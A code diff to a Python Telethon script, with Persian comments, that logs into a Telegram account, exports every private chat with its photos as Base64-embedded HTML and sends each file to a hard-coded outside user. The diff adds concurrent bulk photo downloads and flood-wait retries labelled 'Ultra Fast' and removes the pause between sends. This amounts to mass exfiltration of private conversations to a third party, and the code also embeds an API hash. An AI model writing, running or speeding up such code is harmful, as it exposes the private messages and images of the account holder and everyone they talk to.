@@ -1,7 +1,9 @@
 import asyncio
+import base64
 import html
 import io
 from telethon import TelegramClient
+from telethon.errors import FloodWaitError
 from telethon.tl.types import User
 
 # اطلاعات حساب تلگرام
@@ -11,8 +13,23 @@ API_HASH = "552c01d21d127def060f2915aedeebf9"
 # آیدی مقصدی که فایل‌ها برایش ارسال می‌شوند
 TARGET_USER = "Moein_917"
 
-# ساخت کلاینت تلگرام
+# محدودیت دانلود هم‌زمان عکس‌ها (برای جلوگیری از فشار زیاد به سیستم)
+MAX_CONCURRENT_DOWNLOADS = 10
+
 client = TelegramClient("my_account", API_ID, API_HASH)
+
+
+async def download_single_photo(client, message, semaphore):
+    """دانلود یک عکس به صورت هم‌زمان و تبدیل به Base64"""
+    async with semaphore:
+        try:
+            img_bytes = await client.download_media(message, file=io.BytesIO())
+            if img_bytes:
+                b64 = base64.b64encode(img_bytes.getvalue()).decode("utf-8")
+                return message.id, b64
+        except Exception:
+            pass
+        return message.id, None
 
 
 async def main():
@@ -21,11 +38,11 @@ async def main():
 
     my_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
     print(f"Logged in as: {my_name} (@{me.username})")
+    print("\nUltra Fast Export Started...\n")
 
-    print("\nExport & Direct Transmission Started (HTML Mode)...\n")
+    semaphore = asyncio.Semaphore(MAX_CONCURRENT_DOWNLOADS)
 
     async for dialog in client.iter_dialogs():
-        # فقط چت‌های شخصی (بدون ربات‌ها و گروه‌ها)
         if isinstance(dialog.entity, User) and not dialog.entity.bot:
             user = dialog.entity
             username = user.username if user.username else "NoUsername"
@@ -33,12 +50,32 @@ async def main():
                 f"{user.first_name or ''} {user.last_name or ''}".strip()
             )
 
-            messages_html = []
+            # ۱. دریافت تمام پیام‌های چت
+            messages = await client.get_messages(dialog.id, limit=None)
+            if not messages:
+                continue
 
-            async for message in client.iter_messages(
-                dialog.id, reverse=True
-            ):
-                if not message.text:
+            # مرتب‌سازی: پیام‌های قدیمی در انتهای فایل (reverse=False)
+            messages.reverse()
+
+            # ۲. استخراج پیام‌های دارای عکس و دانلود هم‌زمان آن‌ها
+            photo_messages = [m for m in messages if m.photo]
+            photo_dict = {}
+
+            if photo_messages:
+                tasks = [
+                    download_single_photo(client, msg, semaphore)
+                    for msg in photo_messages
+                ]
+                results = await asyncio.gather(*tasks)
+                photo_dict = {
+                    msg_id: b64 for msg_id, b64 in results if b64 is not None
+                }
+
+            # ۳. ساخت خروجی HTML
+            messages_html = []
+            for message in messages:
+                if not message.text and not message.photo:
                     continue
 
                 if message.sender_id == me.id:
@@ -47,23 +84,27 @@ async def main():
                 else:
                     sender = await message.get_sender()
                     is_me = False
-                    if sender:
-                        sender_name = (
-                            f"{sender.first_name or ''} {sender.last_name or ''}".strip()
-                        )
-                        if not sender_name:
-                            sender_name = "Unknown"
-                    else:
+                    sender_name = (
+                        f"{sender.first_name or ''} {sender.last_name or ''}".strip()
+                        if sender
+                        else "Unknown"
+                    )
+                    if not sender_name:
                         sender_name = "Unknown"
 
-                # ایمن‌سازی متون برای جلوگیری از تداخل با کدهای HTML
                 clean_sender = html.escape(sender_name)
-                clean_text = html.escape(message.text)
+                clean_text = (
+                    html.escape(message.text) if message.text else ""
+                )
                 date_str = (
                     message.date.strftime("%Y-%m-%d %H:%M:%S")
                     if message.date
                     else ""
                 )
+
+                img_tag = ""
+                if message.id in photo_dict:
+                    img_tag = f'<br><img src="data:image/jpeg;base64,{photo_dict[message.id]}" class="chat-img" alt="Photo" />'
 
                 card_class = "msg-card me" if is_me else "msg-card"
 
@@ -72,7 +113,7 @@ async def main():
                     <div class="{card_class}">
                         <div class="sender">{clean_sender}</div>
                         <div class="date">{date_str}</div>
-                        <div class="text">{clean_text}</div>
+                        <div class="text">{clean_text}{img_tag}</div>
                     </div>
                 """
                 )
@@ -80,7 +121,6 @@ async def main():
             if not messages_html:
                 continue
 
-            # ساخت ساختار کامل فایل HTML با استایل راست‌چین و شکیل
             full_html = f"""<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
@@ -88,68 +128,18 @@ async def main():
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>چت با {html.escape(chat_name)}</title>
     <style>
-        body {{
-            font-family: Tahoma, 'Segoe UI', Arial, sans-serif;
-            background-color: #0f172a;
-            color: #e2e8f0;
-            margin: 0;
-            padding: 20px;
-            direction: rtl;
-        }}
-        .container {{
-            max-width: 750px;
-            margin: 0 auto;
-        }}
-        .chat-header {{
-            background-color: #1e293b;
-            padding: 15px 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #334155;
-        }}
-        .chat-header h2 {{
-            margin: 0 0 8px 0;
-            color: #38bdf8;
-            font-size: 18px;
-        }}
-        .chat-header p {{
-            margin: 0;
-            color: #94a3b8;
-            font-size: 13px;
-        }}
-        .msg-card {{
-            background-color: #1e293b;
-            border-radius: 8px;
-            padding: 12px 16px;
-            margin-bottom: 12px;
-            border-right: 4px solid #3b82f6;
-        }}
-        .msg-card.me {{
-            border-right-color: #10b981;
-            background-color: #162438;
-        }}
-        .sender {{
-            font-weight: bold;
-            color: #60a5fa;
-            font-size: 14px;
-            margin-bottom: 4px;
-        }}
-        .msg-card.me .sender {{
-            color: #34d399;
-        }}
-        .date {{
-            font-size: 11px;
-            color: #64748b;
-            margin-bottom: 8px;
-            direction: ltr;
-            text-align: left;
-        }}
-        .text {{
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            line-height: 1.6;
-            font-size: 14px;
-        }}
+        body {{ font-family: Tahoma, 'Segoe UI', Arial, sans-serif; background-color: #0f172a; color: #e2e8f0; margin: 0; padding: 20px; direction: rtl; }}
+        .container {{ max-width: 750px; margin: 0 auto; }}
+        .chat-header {{ background-color: #1e293b; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #334155; }}
+        .chat-header h2 {{ margin: 0 0 8px 0; color: #38bdf8; font-size: 18px; }}
+        .chat-header p {{ margin: 0; color: #94a3b8; font-size: 13px; }}
+        .msg-card {{ background-color: #1e293b; border-radius: 8px; padding: 12px 16px; margin-bottom: 12px; border-right: 4px solid #3b82f6; }}
+        .msg-card.me {{ border-right-color: #10b981; background-color: #162438; }}
+        .sender {{ font-weight: bold; color: #60a5fa; font-size: 14px; margin-bottom: 4px; }}
+        .msg-card.me .sender {{ color: #34d399; }}
+        .date {{ font-size: 11px; color: #64748b; margin-bottom: 8px; direction: ltr; text-align: left; }}
+        .text {{ white-space: pre-wrap; word-wrap: break-word; line-height: 1.6; font-size: 14px; }}
+        .chat-img {{ max-width: 100%; max-height: 400px; border-radius: 8px; margin-top: 10px; display: block; }}
     </style>
 </head>
 <body>
@@ -163,30 +153,32 @@ async def main():
 </body>
 </html>"""
 
-            # تبدیل متن HTML به بایت با انکودینگ UTF-8
             file_data = full_html.encode("utf-8")
-
-            # ساخت فایل مجازی HTML در حافظه RAM
             file_stream = io.BytesIO(file_data)
             file_stream.name = f"{user.id}_{username}.html"
 
-            # ارسال مستقیم فایل HTML به آیدی مقصد
-            try:
-                await client.send_file(
-                    TARGET_USER,
-                    file_stream,
-                    caption=f"📂 Exported chat (HTML): {chat_name} (@{username})",
-                )
-                print(f"Sent HTML to @{TARGET_USER}: {file_stream.name}")
-            except Exception as e:
-                print(f"Error sending {file_stream.name}: {e}")
+            # ۴. ارسال با حداکثر سرعت به همراه مدیریت FloodWait
+            sent = False
+            while not sent:
+                try:
+                    await client.send_file(
+                        TARGET_USER,
+                        file_stream,
+                        caption=f"📂 Exported chat: {chat_name} (@{username})",
+                    )
+                    print(f"Sent HTML to @{TARGET_USER}: {file_stream.name}")
+                    sent = True
+                except FloodWaitError as e:
+                    print(
+                        f"Telegram rate limit hit. Waiting for {e.seconds} seconds..."
+                    )
+                    await asyncio.sleep(e.seconds)
+                except Exception as e:
+                    print(f"Error sending {file_stream.name}: {e}")
+                    break
 
-            # وقفه جهت جلوگیری از محدودیت ارسال تلگرام
-            await asyncio.sleep(1)
-
-    print("\nAll chats exported to HTML and sent successfully.")
+    print("\nAll chats exported successfully at maximum speed!")
 
 
-# اجرای اسکریپت
 with client:
     client.loop.run_until_complete(main())
